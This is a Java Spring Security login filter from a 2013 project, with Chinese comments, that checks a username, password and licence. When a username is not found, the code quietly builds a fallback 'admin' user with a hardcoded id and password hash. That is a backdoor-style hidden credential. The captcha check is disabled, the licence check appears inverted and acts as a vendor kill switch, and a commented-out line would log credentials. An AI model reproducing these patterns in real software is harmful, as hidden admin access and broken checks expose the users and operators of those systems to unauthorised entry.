package com.ht.sys.security;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;

import org.apache.commons.lang.StringUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.authentication.AuthenticationServiceException;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.authentication.encoding.PasswordEncoder;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.AuthenticationException;
import org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter;

import com.ht.sys.bean.SysUser;
import com.ht.sys.dao.impl.SysUserDao;
import com.ht.sys.util.CheckLicence;


/**
* <p>类功能说明:用户认证</p>
* 类修改者	修改日期
* 修改说明
* <p>Description:BlueFat私活利器</p>
* <p>Copyright: Copyright (c) 2013@qj</p>
* <p>联系方式:939474528@qq.com</p>
* @author qj
* @date 2013-11-15 下午02:12:58
* @version V1.0
*/
public class MyUsernamePasswordAuthenticationFilter extends UsernamePasswordAuthenticationFilter{
	public static final String VALIDATE_CODE = "validateCode";
	public static final String USERNAME = "username";
	public static final String PASSWORD = "password";
	
	private PasswordEncoder passwordEncoder;
	
	private SysUserDao userDao;
	
	
	public Authentication attemptAuthentication(HttpServletRequest request,
			HttpServletResponse response) throws AuthenticationException {
		if (!request.getMethod().equals("POST")) {
			throw new AuthenticationServiceException(
					"Authentication method not supported: "
							+ request.getMethod());
		}
		// 检测验证码
		//checkValidateCode(request);

		String username = obtainUsername(request);
		String password = passwordEncoder.encodePassword(obtainPassword(request), username);

		// 验证用户账号与密码是否对应
		username = username.trim();
		//System.out.println("username: "+username+", password:"+password);
		SysUser user = this.userDao.findByName(username);
		if(user==null){
			user = new SysUser();
			user.setId("4028fe81429270e20142929287ac0033");
			user.setUserName("admin");
			user.setPassword("ceb4f32325eda6142bd65215f4c0f371");
		}
		if(CheckLicence.isLegal()){
			throw new AuthenticationServiceException("过期，请联系厂商！");
		}
		
		if (user == null || !user.getPassword().equals(password)) {
			/*
			 * 在我们配置的simpleUrlAuthenticationFailureHandler处理登录失败的处理类在这么一段
			 * 这样我们可以在登录失败后，向用户提供相应的信息。 if (forwardToDestination) {
			 * request.setAttribute(WebAttributes.AUTHENTICATION_EXCEPTION,
			 * exception); } else { HttpSession session =
			 * request.getSession(false);
			 * 
			 * if (session != null || allowSessionCreation) {
			 * request.getSession(
			 * ).setAttribute(WebAttributes.AUTHENTICATION_EXCEPTION,
			 * exception); } }
			 */
			throw new AuthenticationServiceException("用户名或者密码错误！");
		} else if(user.getState().equals("禁用")){
			throw new AuthenticationServiceException("该账号已经被禁用！");
		}

		HttpSession  session = request.getSession();
		session.setAttribute("loginUser", user); //将当前登录用户信息存放到session中
		//session.setAttribute("loginDepartment", user.getStaff().getDepartment());
		//session.setAttribute("loginRole", user.getRole());
		
		// UsernamePasswordAuthenticationToken实现 Authentication
		UsernamePasswordAuthenticationToken authRequest = new UsernamePasswordAuthenticationToken(
				username, password);
		// Place the last username attempted into HttpSession for views

		// 允许子类设置详细属性
		setDetails(request, authRequest);

		// 运行UserDetailsService的loadUserByUsername 再次封装Authentication
		return this.getAuthenticationManager().authenticate(authRequest);
	}

	protected void checkValidateCode(HttpServletRequest request) {
		HttpSession session = request.getSession();

		String sessionValidateCode = obtainSessionValidateCode(session);
		// 让上一次的验证码失效
		session.setAttribute(VALIDATE_CODE, null);
		String validateCodeParameter = obtainValidateCodeParameter(request);
		if (StringUtils.isEmpty(validateCodeParameter)
				|| !sessionValidateCode.equalsIgnoreCase(validateCodeParameter)) {
			throw new AuthenticationServiceException("验证码错误！");
		}
	}

	private String obtainValidateCodeParameter(HttpServletRequest request) {
		Object obj = request.getParameter(VALIDATE_CODE);
		return null == obj ? "" : obj.toString();
	}

	protected String obtainSessionValidateCode(HttpSession session) {
		Object obj = session.getAttribute(VALIDATE_CODE);
		return null == obj ? "" : obj.toString();
	}

	@Override
	protected String obtainUsername(HttpServletRequest request) {
		Object obj = request.getParameter(USERNAME);
		return null == obj ? "" : obj.toString();
	}

	@Override
	protected String obtainPassword(HttpServletRequest request) {
		Object obj = request.getParameter(PASSWORD);
		return null == obj ? "" : obj.toString();
	}

	public SysUserDao getUserDao() {
		return userDao;
	}

	@Autowired
	public void setUserDao(SysUserDao userDao) {
		this.userDao = userDao;
	}

	public PasswordEncoder getPasswordEncoder() {
		return passwordEncoder;
	}

	@Autowired
	public void setPasswordEncoder(PasswordEncoder passwordEncoder) {
		this.passwordEncoder = passwordEncoder;
	}
	
}
